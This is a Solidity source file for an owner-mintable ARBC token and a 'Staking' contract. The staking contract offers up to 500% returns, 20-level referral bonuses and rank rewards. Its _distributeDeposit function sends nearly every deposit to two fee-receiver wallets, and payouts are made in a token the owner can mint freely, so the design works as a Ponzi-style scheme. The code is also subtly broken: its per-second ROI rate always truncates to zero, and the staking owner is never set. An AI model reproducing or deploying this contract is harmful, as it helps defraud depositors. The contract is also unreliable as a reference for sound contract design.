// SPDX-License-Identifier: GPLv3
pragma solidity ^0.6.12;
import 'hardhat/console.sol';
/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IPancakeswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeswapV2Router02 is IPancakeswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

contract Ownable is Context {
  address internal owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function getOwner() public view returns (address) {
    return owner;
  }

  modifier onlyOwner() {
    require(owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}


// ARBC TOKEN
contract ARBC is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  constructor() public {
    _name = "ARBC";
    _symbol = "ARBC";
    _decimals = 18;
    _totalSupply = 10000000000 * 10**18;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }
  
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external override view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }

  function burn(uint256 amount) public onlyOwner returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

 
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

 
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

 
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}


// ARBC STAKING
contract Staking {
    using SafeMath for uint256; 
    IERC20 public usdt;
    IERC20 public arbToken;
    IERC20 public arbcToken;
    address payable internal owner;
     uint256 private constant feePercents = 100;
    uint256 private constant baseDivider = 10000;
    uint256 private constant minDeposit = 25e18;
    uint256 private constant timeStep = 1 days;
     
    uint256 private constant referDepth = 20;

    uint256[20] private ref_bonuses = [2000, 1500, 1000, 500, 400, 300, 300, 300, 300, 300, 200, 200, 200, 200, 200, 300, 300, 300, 300, 300];
    
    address public feeReceiver;
    address public feeReceiver2;
    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public totalDeposited; 
     
    address[] public depositors;

    struct UserInfo {
        uint8 cycle;
        address referrer;
        uint256 latest_directs;
        uint256 deposit_amount;
        uint256 deposit_time;
        uint256 level;
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 totalDirectDeposit;
        // uint256 teamTotalDeposit;
        uint256 total_structure;
        uint256 downline_business;
        uint256 referrals;
        uint8 direct_status;
        
    }

    struct DailyRankBonus {
        uint256 amount; 
        uint256 start;
        uint256 daysCompleted;
        uint256 latestClaimed;
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(address => DailyRankBonus) public daily_mtc;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
        uint256 payouts; // Total Earning
        uint256 deposit_payouts; // ROI
        uint256 match_bonus; // Level
        uint rank_bonus; // Rank
        uint256 total_withdraw_token;
        uint8 block_status;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    bool public isFreezeReward;
    IPancakeswapV2Router02 public pancakeRouter;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event WithdrawToken(address user, uint256 withdrawable);

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Claimed(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address _arbcToken, address _usdtAddr, address _arbToken, address _feeReceiver, address _feeReceiver2) public {
        // usdt = IERC20(_usdtAddr);
        arbToken = IERC20(_arbToken);
        arbcToken = IERC20(_arbcToken);
        usdt = IERC20(_usdtAddr);


        feeReceiver = _feeReceiver;
        feeReceiver2 = _feeReceiver2;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;

        console.log('Default refer is ', msg.sender);
        defaultRefer = msg.sender;
        //mainnet
        // pancakeRouter = IPancakeswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        //testnet
        pancakeRouter = IPancakeswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
    }


    function deposit(address _upline, uint256 _amount) external {
        _setUpline(msg.sender, _upline, _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        UserInfo storage user = userInfo[_addr];
        UserInfo storage uplineUser = userInfo[_upline];

        if(user.referrer == address(0) && _upline != _addr && _addr != owner && (uplineUser.deposit_time > 0 || _upline == owner)) {
            
            user.referrer = _upline;
            
            uplineUser.referrals++;

            if(_amount >= uplineUser.deposit_amount ){
                uplineUser.latest_directs++;
            }

            uplineUser.totalDirectDeposit += _amount;
            emit Upline(_addr, _upline);
            totalUser++;
            
            for (uint256 i = 0; i < ref_bonuses.length; i++) {
                if (_upline != address(0)) {
                    uplineUser.total_structure++;
                    teamUsers[_upline][i].push(_addr);
                    uplineUser.downline_business = uplineUser.downline_business.add(_amount);

                    if(_upline == defaultRefer) break;
                    _upline = uplineUser.referrer;
                } else break;
            }
        }
    }

    function claim() external {
        address _user = msg.sender;
        UserInfo storage user = userInfo[_user];

        require(user.level >= 1, "Not eligible for claim");
        require( daily_mtc[_user].daysCompleted <= 100, "Days Completed" );

        if(block.timestamp >= daily_mtc[_user].latestClaimed + 1 days ) {
            daily_mtc[_user].daysCompleted = daily_mtc[_user].daysCompleted.add(1);
            daily_mtc[_user].latestClaimed = block.timestamp;

            rewardInfo[_user].rank_bonus = rewardInfo[_user].rank_bonus.add(daily_mtc[_user].amount);
            emit Claimed(_user, daily_mtc[_user].amount);
        } else {
            revert("Either already claimed or claim period has expired");
        }
    }
  
    function withdraw() external {

        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        require(rewardInfo[msg.sender].payouts < max_payout, "Full payouts");
        
        // ROI payout..
        if( to_payout > 0) {

            if (rewardInfo[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - rewardInfo[msg.sender].payouts;
            }

            rewardInfo[msg.sender].deposit_payouts += to_payout;
            rewardInfo[msg.sender].payouts += to_payout;

            if(userInfo[msg.sender].cycle == 0) {
                _refPayout(msg.sender, to_payout);
            }
        }

       // Match payout
        if( rewardInfo[msg.sender].payouts < max_payout && rewardInfo[msg.sender].match_bonus > 0) {
            uint256 match_bonus = rewardInfo[msg.sender].match_bonus;

            if (rewardInfo[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - rewardInfo[msg.sender].payouts;
            }

            rewardInfo[msg.sender].match_bonus = 0;
            rewardInfo[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;

        }

        // Rank Payout.
        if( rewardInfo[msg.sender].payouts < max_payout && rewardInfo[msg.sender].rank_bonus > 0) {
            uint256 daily_mtc_bonus = rewardInfo[msg.sender].rank_bonus;

            if (rewardInfo[msg.sender].payouts + daily_mtc_bonus > max_payout) {
                daily_mtc_bonus = max_payout - rewardInfo[msg.sender].payouts;
            }

            rewardInfo[msg.sender].rank_bonus = 0;
            rewardInfo[msg.sender].payouts += daily_mtc_bonus;
            to_payout += daily_mtc_bonus;
        }
        
        
        rewardInfo[msg.sender].match_bonus = 0;
        rewardInfo[msg.sender].rank_bonus = 0;

        require(to_payout > 0, "Zero payout");
        uint256 entire_payout = to_payout;
        
        // total_withdraw += to_payout;
        
        uint256 _payoutValue = getTokenPrice(entire_payout, address(arbcToken));
        _deliverTokens(address(arbcToken), msg.sender, _payoutValue); // Transfer ARBC

        rewardInfo[msg.sender].total_withdraw_token = rewardInfo[msg.sender].total_withdraw_token.add(_payoutValue);
        
        emit Withdraw(msg.sender, _payoutValue);

        if(rewardInfo[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, rewardInfo[msg.sender].payouts);
        }
    }


    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].downline_business.add(userInfo[teamUsers[_user][0][i]].maxDeposit);
            // uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].maxDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function megaBooster(address _addr) internal  {
        UserInfo storage user = userInfo[_addr];
        RewardInfo storage userRewards = rewardInfo[_addr];

        uint256 total_referrals = user.referrals;
        uint256 joinedTime = user.deposit_time;
        uint8 direct_status = user.direct_status;

        if(total_referrals >= 10 && block.timestamp < joinedTime + 7 days && direct_status == 0 ) {
            uint max_payout = user.deposit_amount * 200 / 100;
            uint remainingPayout = max_payout - userRewards.deposit_payouts;

            user.direct_status = 1;
            userRewards.deposit_payouts += remainingPayout;
            userRewards.payouts += remainingPayout;
        }
    }

    function maxPayoutOf(uint256 _amount) view external returns(uint256) {
        uint256 _per;
         if(userInfo[msg.sender].referrals >= 1) {
            _per = _amount * 500 / 100;
        } else {
            _per = _amount * 200 / 100;
        }
        return _per;
    }


    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        uint256 per;
        max_payout = this.maxPayoutOf(userInfo[_addr].deposit_amount);
        
        if( rewardInfo[_addr].deposit_payouts < max_payout ) {
            
            uint256 total_directs = userInfo[_addr].referrals;
        
            if(total_directs >= 2 && total_directs < 5) {
                // per = 44; //0.44 daily
                per = 312; // 3.12 weekly
            } else if(total_directs >= 5 && total_directs < 10) {
                // per = 53; //0.53 daily
                per = 375; //3.75 weekly
            } else if(total_directs >= 10) {
                // per = 71; //0.71 days
                per = 500; //5% weekly
            } else {
                // per = 35; //0.35 daily
                per = 250; //2.5 weekly
            }

            // Convert weekly ROI to per-second basis
            uint256 perSecond = per / (1 weeks);

            payout = (((userInfo[_addr].deposit_amount * perSecond) / baseDivider) * ((block.timestamp - userInfo[_addr].deposit_time) / 1 weeks)) - rewardInfo[_addr].deposit_payouts;
            
            if(rewardInfo[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - rewardInfo[_addr].deposit_payouts;
            }
        }
    }


    function _refPayout(address _addr, uint256 _amount) private {
        UserInfo storage user = userInfo[_addr];
        address upline = user.referrer;
        uint256 total_referrals = user.referrals;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(upline == address(0)) break;

            if(total_referrals * 2 >= i) {
                uint256 amt = _amount;
                uint256 bonus = amt * ref_bonuses[i] / baseDivider;
                rewardInfo[upline].match_bonus = rewardInfo[upline].match_bonus.add(bonus);
                emit MatchPayout(upline, _addr, bonus);
            }

            upline = userInfo[upline].referrer;
        }
    }

    // function _updateTeamNum(address _user) private {
    //     UserInfo storage user = userInfo[_user];
    //     address upline = user.referrer;
    //     for(uint256 i = 0; i < referDepth; i++){
    //         if(upline != address(0)){
    //             // userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
    //             teamUsers[upline][i].push(_user);
    //             if(upline == defaultRefer) break;
    //             upline = userInfo[upline].referrer;
    //         }else{
    //             break;
    //         }
    //     }
    // }


    function rankUpdation( address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                // userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _calLevelNow(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _calLevelNow(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.maxDeposit;
        uint256 level = user.level;
        if(total >= 1e18){
            
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

            if( level == 0 &&  maxTeam >= 5000e18 && otherTeam >= 5000e18 ){
                
                user.level = 1;
                daily_mtc[_user].amount = 5e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;

            } else if( level == 1 && maxTeam >= 10000e18 && otherTeam >= 10000e18 ){
                
                user.level = 2;
                daily_mtc[_user].amount = 10e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;

            } else if( level == 2 &&  maxTeam >= 25000e18 && otherTeam >= 25000e18 ){
            
                user.level = 3;
                daily_mtc[_user].amount = 25e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 3 &&  maxTeam >= 50000e18 && otherTeam >= 50000e18 ){
                
                user.level = 4;
                daily_mtc[_user].amount = 50e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 4 &&  maxTeam >= 100000e18 && otherTeam >= 100000e18 ){
                    
                user.level = 5;
                daily_mtc[_user].amount = 100e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                    
            } else if( level == 5 &&  maxTeam >= 200000e18 && otherTeam >= 200000e18 ){
                
                user.level = 6;
                daily_mtc[_user].amount = 200e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 6 &&  maxTeam >= 500000e18 && otherTeam >= 500000e18 ){
                
                user.level = 7;
                daily_mtc[_user].amount = 500e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 7 &&  maxTeam >= 1000000e18 && otherTeam >= 1000000e18 ){
                
                user.level = 8;
                daily_mtc[_user].amount = 1000e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 8 &&  maxTeam >= 2500000e18 && otherTeam >= 2500000e18 ){
                
                user.level = 9;
                daily_mtc[_user].amount = 2500e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
                
            } else if( level == 9 &&  maxTeam >= 5000000e18 && otherTeam >= 5000000e18 ){
                
                user.level = 10;
                daily_mtc[_user].amount = 5000e18;
                daily_mtc[_user].start = block.timestamp;
                daily_mtc[_user].daysCompleted = 0;
            }
        }
      
    }


     function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceiver, fee);
        usdt.transfer(feeReceiver2, fee);
        usdt.transfer(feeReceiver2, _amount.sub(fee).sub(fee));
    }

    function swapUsdtForArbc(uint _usdtAmount) private {
        usdt.approve(address(pancakeRouter), _usdtAmount);

        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(arbToken);

        pancakeRouter.swapExactTokensForTokens(
            _usdtAmount,
            0,
            path,
            address(this),
            block.timestamp.add(300)
        );
    }

    function getTokenPrice(uint256 _amount, address _tokenAddress) private view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = _tokenAddress;

        uint256[] memory amounts = pancakeRouter.getAmountsOut(_amount, path);
        return amounts[1];
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        
        require(user.referrer != address(0) || _user == owner, "No upline");
        require(_amount <= usdt.balanceOf(_user), "Insufficient Balance");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "required: Multiple of 25 and greater than 25");

        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");
        require(user.maxDeposit == 0, "deposit can be made only once");

        usdt.transferFrom(_user, address(this), _amount);
        swapUsdtForArbc(_amount.mul(10).div(100));
        _distributeDeposit(_amount);

        user.maxDeposit = _amount;
        depositors.push(_user);
        totalDeposited = totalDeposited.add(_amount);

        RewardInfo storage userRewards = rewardInfo[_user];

        string memory ErrorMsg = "Error: withdraw your earning first";
        
        require(userRewards.match_bonus == 0, ErrorMsg);
        require(userRewards.rank_bonus == 0, ErrorMsg);

        if(user.deposit_time > 0) {
            user.cycle++;
            require(userRewards.payouts >= this.maxPayoutOf(user.deposit_amount), "Deposit already exists");
            require(_amount >= user.deposit_amount, "Less than previous deposit");
        }

        if(user.totalDeposit == 0) {
          userInfo[user.referrer].referrals = userInfo[user.referrer].referrals.add(1);
        }
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.latest_directs = 0;
        user.deposit_amount = _amount;
        
        userRewards.deposit_payouts = 0;
        userRewards.payouts = 0;
        userRewards.match_bonus = 0;

        user.deposit_time = uint40(block.timestamp);

        megaBooster(user.referrer);
        rankUpdation(msg.sender);

        uint256 airdrop = getTokenPrice(_amount, address(arbToken));
        _deliverTokens(address(arbToken), msg.sender, airdrop); // Transfer ARB
    }
   
     function _deliverTokens(address _token, address _beneficiary, uint256 _tokenAmount) internal {
        IERC20(_token).transfer(_beneficiary, _tokenAmount);
    }

    function transferBep20Token(address token, uint256 amount) public {
        require(msg.sender == owner, "contract: caller is not the contract");
        IERC20(token).transfer(owner, amount);
    }
}